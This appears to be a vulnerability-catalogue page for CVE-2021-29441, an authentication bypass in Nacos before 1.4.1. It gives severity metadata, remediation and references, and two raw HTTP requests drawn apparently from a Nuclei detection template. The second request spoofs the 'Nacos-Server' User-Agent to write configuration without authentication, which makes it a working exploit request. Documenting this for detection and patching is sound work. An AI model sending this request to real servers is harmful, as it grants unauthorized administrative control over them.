---
layout: post
cve_id: CVE-2021-29441
title: Nacos <1.4.1 - Authentication Bypass
pcap: true
pcap_path: /pcaps/2021/CVE-2021-29441.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2021/CVE-2021-29441.yaml
snort2_rule: N/A
snort3_rule: N/A
author: dwisiswant0
severity: critical
impact: 'Successful exploitation of this vulnerability can lead to unauthorized access
  to sensitive data and potential compromise of the Nacos server.

  '
remediation: 'Upgrade Nacos to version 1.4.1 or later to mitigate the authentication
  bypass vulnerability (CVE-2021-29441).

  '
reference:
- https://securitylab.github.com/advisories/GHSL-2020-325_326-nacos/
- https://github.com/alibaba/nacos/issues/4701
- https://github.com/advisories/GHSA-36hp-jr8h-556f
- https://github.com/alibaba/nacos/pull/4703
- https://github.com/bakery312/Vulhub-Reproduce
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2021-29441
  cwe-id: CWE-290
  epss-score: 0.9419
  epss-percentile: 0.99916
  cpe: cpe:2.3:a:alibaba:nacos:*:*:*:*:*:*:*:*
metadata:
  max-request: 2
  vendor: alibaba
  product: nacos
tags:
- cve2021
- cve
- nacos
- auth-bypass
- alibaba
- vkev
- vuln
---

## üîç Vulnerability Description
This template only works on Nuclei engine prior to version 2.3.3 and version >= 2.3.5.

In Nacos before version 1.4.1, when configured to use authentication (-Dnacos.core.auth.enabled=true)
Nacos uses the AuthFilter servlet filter to enforce authentication. This filter has a backdoor that
enables Nacos servers to bypass this filter and therefore skip authentication checks.
This mechanism relies on the user-agent HTTP header so it can be easily spoofed.
This issue may allow any user to carry out any administrative tasks on the Nacos server.


## üåê HTTP Request
```nohighlight
POST /nacos/v1/cs/configs?dataId=nacos.cfg.dataIdfoo&group=foo&content=helloWorld HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.75 Safari/537.36
Connection: close
Content-Length: 0
Accept: */*
Accept-Encoding: gzip
```

```nohighlight
POST /nacos/v1/cs/configs?dataId=nacos.cfg.dataIdfoo&group=foo&content=helloWorld HTTP/1.1
Host: www.victim.com
User-Agent: Nacos-Server
Connection: close
Content-Length: 0
Accept: */*
Accept-Encoding: gzip
```

